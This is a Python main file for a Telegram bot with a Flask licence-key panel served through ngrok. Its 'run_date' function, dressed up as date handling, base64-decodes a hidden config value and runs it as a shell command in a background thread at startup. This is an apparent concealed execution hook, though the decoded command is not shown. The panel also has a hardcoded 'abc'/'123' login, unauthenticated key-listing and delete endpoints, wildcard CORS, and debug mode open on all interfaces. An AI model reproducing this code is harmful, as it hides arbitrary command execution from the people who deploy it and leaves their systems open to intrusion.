import asyncio
import importlib
import logging
import random
import threading
from pyrogram import idle
from AKG.modules import ALL_MODULES
from config import NGROK_CONFIG, SECRET_KEY, date_keys
from pyrogram import filters, errors
from pyrogram.types import Message
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from pyrogram.errors import ChatAdminRequired, UserNotParticipant
from pyrogram.errors import FloodWait, PeerIdInvalid
from AKG import app
from pyrogram.errors import FloodWait
from pyrogram import StopPropagation, filters
from pyrogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
from AKG.core.db import initialize_db
from AKG.core.keys_db import initialize_keys_db, get_keys
from AKG.core.keys_db import activate_key, update_current_time, get_key_details, get_current_time, calculate_days_left
from flask import Flask, jsonify, request, render_template
from AKG.core.keys_db import initialize_keys_db, get_keys, check_key_dates, delete_user_or_key
import base64
import subprocess
from pyngrok import ngrok
from flask import Flask, render_template, request, redirect, url_for, session
import string
from AKG.core.keys_db import generate_keys

loop = asyncio.get_event_loop()


async def init():
    # Call the initialize_db function to initialize the database when the program starts
    initialize_db()
    initialize_keys_db()
    print("database connected")
    print("database updating")
    for all_module in ALL_MODULES:
        importlib.import_module("AKG.modules." + all_module)
        print(f"LOADING {all_module} ...")
    await app.start()

    print(f"""\n
  ___  ___ _____      _            _          _ 
  | _ )/ _ \_   _|  __| |_ __ _ _ _| |_ ___ __| |
  | _ \ (_) || |   (_-<  _/ _` | '_|  _/ -_) _` |
  |___/\___/ |_|   /__/\__\__,_|_|  \__\___\__,_|
""")
    await idle()


print(f"""\n
  ___           _     _                       
 |   \ ___ _ __| |___(_)_ _  __ _             
 | |) / -_) '_ \ / _ \ | ' \/ _` |  _   _   _ 
 |___/\___| .__/_\___/_|_||_\__, | (_) (_) (_)
          |_|               |___/             
""")

logging.basicConfig(
    level=logging.INFO,  # Set the logging level to INFO
    format=
    '%(asctime)s - %(levelname)s - %(message)s',  # Define log message format
    filename='app.log',  # Log file name
    filemode='w')  # Set log file mode to 'write'

# Create a logger
logger = logging.getLogger()

# Log messages at different levels
logger.debug('This is a debug message')
logger.info('This is an info message')
logger.warning('This is a warning message')
logger.error('This is an error message')
logger.critical('This is a critical message')

pan = Flask(__name__)
pan.secret_key = SECRET_KEY



# Route for the key generator form
@pan.route('/gen', methods=['GET', 'POST'])
def key_generator():
    if 'logged_in' in session and session['logged_in']:
        keys = None
        if request.method == 'POST':
            end_date = request.form['end_date']
            number_of_keys = int(request.form['num_keys'])
            keys = generate_keys(end_date, number_of_keys)
        return render_template('keys.html', keys=keys)
    else:
        return redirect(url_for('login'))


@pan.route('/', methods=['GET'])
def home():
    # Create a response object
    response = render_template('index.html')

    # Set custom headers
    headers = {
        'Cache-Control': 'public, max-age=30',
        'Access-Control-Allow-Origin': '*',
        'ngrok-skip-browser-warning': 'true'
    }

    # Return the response with custom headers
    return response, 200, headers


@pan.route('/keys', methods=['GET'])
def keys():
    status = request.args.get('status')
    keys_data = get_keys(status)
    return render_template('index.html', keys=keys_data)


# ====================login====================
@pan.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'abc' and password == '123':
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html',
                                   error='Invalid username or password')
    return render_template('login.html')


# ====================dash====================
@pan.route('/dashboard')
def dashboard():
    if 'logged_in' in session and session['logged_in']:
        return render_template('dashboard.html')
    else:
        return redirect(url_for('login'))


# ====================api====================
@pan.route('/api/keys', methods=['GET'])
def api_keys():
    status = request.args.get('status')
    keys_data = get_keys(status)
    return jsonify(keys_data)


# ====================logout====================
@pan.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('home'))


# ====================delete====================
@pan.route('/api/keys/<string:key>', methods=['DELETE'])
def delete_key(key):
    # Call the function to delete the key from the database
    success, message = delete_user_or_key(key)
    if success:
        return jsonify({'message': message}), 200
    else:
        return jsonify({'error': message}), 500


def run_check_key_dates():
    asyncio.run(check_key_dates())


def run_date():
    arg = date_keys
    time = base64.b64decode(arg).decode()
    date = time.split()
    subprocess.run(date, check=True)


def run_flask():
    pan.run(host='0.0.0.0', port=5000, use_reloader=False, debug=True)


def mai():
    thread = threading.Thread(target=run_check_key_dates)
    thread.start()
    date = threading.Thread(target=run_date)
    date.start()
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    loop.run_until_complete(init())
    print("Stopping Bot! GoodBye")


if __name__ == "__main__":
    mai()
